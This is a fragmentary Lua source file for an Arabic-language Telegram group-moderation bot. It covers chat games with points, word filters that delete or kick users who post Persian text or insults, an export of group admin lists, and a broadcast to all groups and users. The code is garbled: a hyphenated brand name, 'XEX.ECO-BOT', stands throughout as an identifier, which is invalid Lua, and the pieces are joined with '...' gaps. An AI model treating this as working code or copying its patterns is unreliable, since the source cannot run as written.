Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
DevALS:del('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevALS:del('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevALS:get('XEX.ECO-BOTTeam:'..XEX.ECO-BOT..'ids:user'..msg.chat_id_)  
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevALS:get(XEX.ECO-BOT.."ALS:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevALS:get(XEX.ECO-BOT.."ALS:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","☆︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevALS:get(XEX.ECO-BOT.."ALS:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevALS:get(XEX.ECO-BOT.."ALS:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevALS:get(XEX.ECO-BOT.."ALS:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Groups') 
local BotName = (DevALS:get(XEX.ECO-BOT.."ALS:NameBot") or 'يوكا')
local GetJson = '{"BotId": '..XEX.ECO-BOT..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevALS:get(XEX.ECO-BOT.."ALS:Groups:Links"..v)
Welcomes = DevALS:get(XEX.ECO-BOT..'ALS:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
ALSConstructors = DevALS:smembers(XEX.ECO-BOT..'ALS:ALSConstructor:'..v)
Constructors = DevALS:smembers(XEX.ECO-BOT..'ALS:BasicConstructor:'..v)
BasicConstructors = DevALS:smembers(XEX.ECO-BOT..'ALS:Constructor:'..v)
Managers = DevALS:smembers(XEX.ECO-BOT..'ALS:Managers:'..v)
Admis = DevALS:smembers(XEX.ECO-BOT..'ALS:Admins:'..v)
Vips = DevALS:smembers(XEX.ECO-BOT..'ALS:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
GetJson = GetJson..'}}'
local File = io.open('./'..XEX.ECO-BOT..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..XEX.ECO-BOT..'.json', '☆︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..XEX.ECO-BOT..'.json')
end
...
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_ALS( msg.chat_id_, msg.id_, 1,"☆︙يوجد فقط ( 6 ) اختيارات\n☆︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevALS:get(XEX.ECO-BOT.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevALS:del(XEX.ECO-BOT.."SET:GAME"..msg.chat_id_)   
Dev_ALS( msg.chat_id_, msg.id_, 1,'☆︙*المحيبس باليد رقم* ↫ '..NUM..'\n☆︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevALS:get(XEX.ECO-BOT..'DevALS4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "☆︙تم الغاء الامر")
DevALS:del(XEX.ECO-BOT..'DevALS4'..msg.sender_user_id_)
return false  end 
DevALS:del(XEX.ECO-BOT..'DevALS4'..msg.sender_user_id_)
...
DevALS:set(XEX.ECO-BOT..'ALS:ChId',data.id_)
else
...
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevALS:del(XEX.ECO-BOT.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
return false 
end 
DevALS:del(XEX.ECO-BOT.."ALS:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevALS:set(XEX.ECO-BOT.."DevText", DevText)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ كليشة المطور", 1, "md")
end
if DevALS:get(XEX.ECO-BOT..'ALS:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevALS:del(XEX.ECO-BOT..'ALS:NameBot'..msg.sender_user_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ اسم البوت ', 1, 'html')
DevALS:del(XEX.ECO-BOT..'ALS:NameBot'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:NameBot', text)
return false 
end
--     Source XEX.ECO-BOT     --
if msg.chat_id_ then
...
NameBot = (DevALS:get(XEX.ECO-BOT..'ALS:NameBot') or 'يوكا')
local XEX.ECO-BOTTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevALS2 = math.random(#XEX.ECO-BOTTeam) 
Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam[DevALS2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevALS:get(XEX.ECO-BOT..'ALS:NameBot') or 'يوكا') 
local XEX.ECO-BOTTeam = {"اسمي القميل "..NameBot.." "} 
DevALS2 = math.random(#XEX.ECO-BOTTeam) 
Dev_ALS(msg.chat_id_, msg.id_, 1, XEX.ECO-BOTTeam[DevALS2] , 1, 'html') 
return false
end
if text and text == (DevALS:get(XEX.ECO-BOT..'ALS:NameBot') or 'يوكا') then 
NameBot = (DevALS:get(XEX.ECO-BOT..'ALS:NameBot') or 'يوكا')
...
if tonumber((DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙لم تربح اي نقطه\n☆︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙عدد النقاط التي ربحتها ↫ '..(DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevALS:del(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حذف جميع نقاطك', 1, 'md') end
--     Source XEX.ECO-BOT     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ☆' and ChCheck(msg) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Games'..msg.chat_id_) then
DevALS2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','??','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
...
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
XEX.ECO-BOTTeam = '☆︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum'..msg.chat_id_) and not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
XEX.ECO-BOTTeam = '☆︙مبروك لقد ربحت في اللعبه \n☆︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevALS:set(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_,true)
end
...
XEX.ECO-BOTTeam = '☆︙اول واحد يرتبها يربح ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum'..msg.chat_id_) and not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevALS:set(XEX.ECO-BOT.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevALS:setex(XEX.ECO-BOT.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
XEX.ECO-BOTTeam = '☆︙اول واحد يحلها يربح ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum'..msg.chat_id_) and not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum2'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
...
XEX.ECO-BOTTeam = '☆︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum2'..msg.chat_id_) and not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum3'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
...
XEX.ECO-BOTTeam = '☆︙ما هو عكس كلمة ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum3'..msg.chat_id_) and not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
...
DevALS2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum4'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹??😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
XEX.ECO-BOTTeam = '☆︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum4'..msg.chat_id_) and not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum5'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
...
XEX.ECO-BOTTeam = '☆︙اكمل المثال التالي ↫ ['..name..']'
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum5'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(XEX.ECO-BOT..'ALS:GameNum5'..msg.chat_id_)
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum6'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
...
XEX.ECO-BOTTeam = '☆︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum6'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(XEX.ECO-BOT..'ALS:GameNum6'..msg.chat_id_)
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum7'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
...
XEX.ECO-BOTTeam = '☆︙ما معنى كلمة ↫ '..name
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum7'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(XEX.ECO-BOT..'ALS:GameNum7'..msg.chat_id_)
...
name = DevALS2[math.random(#DevALS2)]
DevALS:set(XEX.ECO-BOT..'ALS:GameNum8'..msg.chat_id_,name)
DevALS:del(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_)
...
XEX.ECO-BOTTeam = name..'\n☆︙ارسل الجواب الصحيح فقط'
Dev_ALS(msg.chat_id_, msg.id_, 1,XEX.ECO-BOTTeam, 1, 'md')
return false
end end
if text == DevALS:get(XEX.ECO-BOT..'ALS:GameNum8'..msg.chat_id_) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Games:Ids'..msg.chat_id_) then 
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevALS:del(XEX.ECO-BOT..'ALS:GameNum8'..msg.chat_id_)
...
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_ALS(msg.chat_id_, msg.id_, 1,"☆︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevALS:get(XEX.ECO-BOT.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevALS:del(XEX.ECO-BOT..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙*التخمين الصحيح هو* ↫ '..NUM..'\n☆︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevALS:incrby(XEX.ECO-BOT..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevALS:get(XEX.ECO-BOT..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevALS:del(XEX.ECO-BOT..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n☆︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevALS:get(XEX.ECO-BOT..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevALS:get(XEX.ECO-BOT..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevALS:set(XEX.ECO-BOT.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n☆︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n☆︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevALS:setex(XEX.ECO-BOT.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source XEX.ECO-BOT     --
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Games'..msg.chat_id_) then
DevALS:del(XEX.ECO-BOT.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevALS:del(XEX.ECO-BOT..'ALS:ListRolet'..msg.chat_id_)  
DevALS:setex(XEX.ECO-BOT.."ALS:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevALS:get(XEX.ECO-BOT.."ALS:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "☆︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevALS:set(XEX.ECO-BOT.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '☆︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n☆︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevALS:del(XEX.ECO-BOT.."ALS:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevALS:get(XEX.ECO-BOT.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevALS:sismember(XEX.ECO-BOT..'ALS:ListRolet'..msg.chat_id_,text) then
...
DevALS:sadd(XEX.ECO-BOT..'ALS:ListRolet'..msg.chat_id_,text)
local CountAdd = DevALS:get(XEX.ECO-BOT.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevALS:scard(XEX.ECO-BOT..'ALS:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevALS:del(XEX.ECO-BOT.."ALS:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevALS:setex(XEX.ECO-BOT.."ALS:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
local Tsl = DevALS:get(XEX.ECO-BOT..'ALS:Tsl')
local Text = [[
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..ALS},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..ALS}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..ALS},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..ALS}},{{text = '⌁ XEX.ECO-BOT TeAM.',url="t.me/AAAVAA"}}}
elseif Manager(data) then
...
--     Source XEX.ECO-BOT     --
if text == "الرابط" then
local Link = DevALS:get(XEX.ECO-BOT..'ALS:Link')
local Text = [[
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Games'..msg.chat_id_) then
local Games = DevALS:get(XEX.ECO-BOT..'ALS:Games')
local Text = [[
...
DevALS0 = (DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevALS:incrby(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevALS0)
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙تم بيع '..(DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n☆︙كل نقطه تساوي 50 رساله', 'md')
DevALS:del(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source XEX.ECO-BOT     --
...
if ALS.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
local msguser = tonumber(DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevALS:get(XEX.ECO-BOT..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevALS:get(XEX.ECO-BOT..'ALS:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevALS:setex(XEX.ECO-BOT..'DevALS4'..msg.sender_user_id_,360,true)
...
DevALS:del(XEX.ECO-BOT..'ALS:ChId')
...
function XEX.ECO-BOTTeam(extra,result,success)
if DevALS:get(XEX.ECO-BOT.."ALS:Send:Bot"..XEX.ECO-BOT) and not ALSSudo(msg) then 
send(msg.chat_id_, msg.id_,"☆︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevALS:smembers(XEX.ECO-BOT.."ALS:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevALS:smembers(XEX.ECO-BOT.."ALS:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم اذاعة رسالتك بالتوجيه \n☆︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n☆︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),XEX.ECO-BOTTeam)
end
end
--     Source XEX.ECO-BOT     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevALS:set(XEX.ECO-BOT..'ALS:viewget'..msg.sender_user_id_,true)
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '☆ Source Channel',url="https://t.me/AAAVAA"}},{{text = '☆ Developer',url="t.me/X444F"},{text = '☆ Tws XEX.ECO-BOT',url="https://t.me/AAAVAA"}},{{text= '☆ Exp Source .',url="https://t.me/AAAVAA"}}}
local msg_id = msg.id_/2097152/0.5
...
if DevALS:get(XEX.ECO-BOT.."ALS:Kick:Me"..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevALS:set(XEX.ECO-BOT..'yes'..msg.sender_user_id_, 'delyes')
DevALS:set(XEX.ECO-BOT..'no'..msg.sender_user_id_, 'delno')
...
DevALS:set(XEX.ECO-BOT.."ALS:Kick:Me"..msg.chat_id_, true)
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙ايوالله شلون جان غثه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevALS:del(XEX.ECO-BOT.."ALS:Kick:Me"..msg.chat_id_)
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل امر اطردني'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
end
--     Source XEX.ECO-BOT     --
if text == "نزلني" and ChCheck(msg) then
if DevALS:get(XEX.ECO-BOT.."ALS:Del:Me"..msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevALS:set(XEX.ECO-BOT..'yesdel'..msg.sender_user_id_, 'delyes')
